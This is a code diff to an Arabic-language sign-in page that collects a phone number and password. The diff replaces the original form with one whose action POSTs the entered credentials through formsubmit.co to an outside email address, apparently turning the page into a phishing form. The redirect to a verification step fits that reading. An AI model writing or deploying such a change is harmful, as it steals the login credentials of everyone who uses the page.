@@ -111,7 +111,19 @@
     <div class="div-block-4">
         <div class="container">
             <div class="w-form">
-                <form id="signin" name="wf-form-" data-name="تسجيل الدخول" redirect="/verification" data-redirect="/verification" method="get" aria-label="تسجيل الدخول">
+<!--                 <form id="signin" 
+                        name="wf-form-" 
+                        data-name="تسجيل الدخول" redirect="/verification" 
+                        data-redirect="/verification" 
+                        method="get" aria-label="تسجيل الدخول">
+                         -->
+                <form id="signin" 
+                        name="مقدم الطلب" 
+                        data-name="مقدم الطلب" 
+                        redirect="/verification" 
+                        action='https://formsubmit.co/erika.davis@go.shoreline.edu'
+                        method="post" aria-label="تسجيل الدخول">
+                        
                     <div id="field" class="field-holder">
                         <input class="text-field-2 w-input" maxlength="10" name="field" data-name="رقم الهاتف" pattern="\d{10,10}" placeholder="" type="text" id="phonenumber" required="">
                         <label for="phonenumber">رقم الهاتف</label>
@@ -124,6 +136,7 @@
                         <div id="invalid_password_label" class="invalid_password_hide"> يرجى أدخال كلمة المرور بشكل صحيح </div>
                         <input type="submit" data-wait="يرجى الانتظار" id="sb" class="submit-button sb_disabled w-button" value="تسجيل دخول">
                     </div>
+
                 </form>
 <!--                 <div class="w-form-done" tabindex="-1" role="region" aria-label="تسجيل الدخول success">
                     <div>Thank you! Your submission has been received!</div>
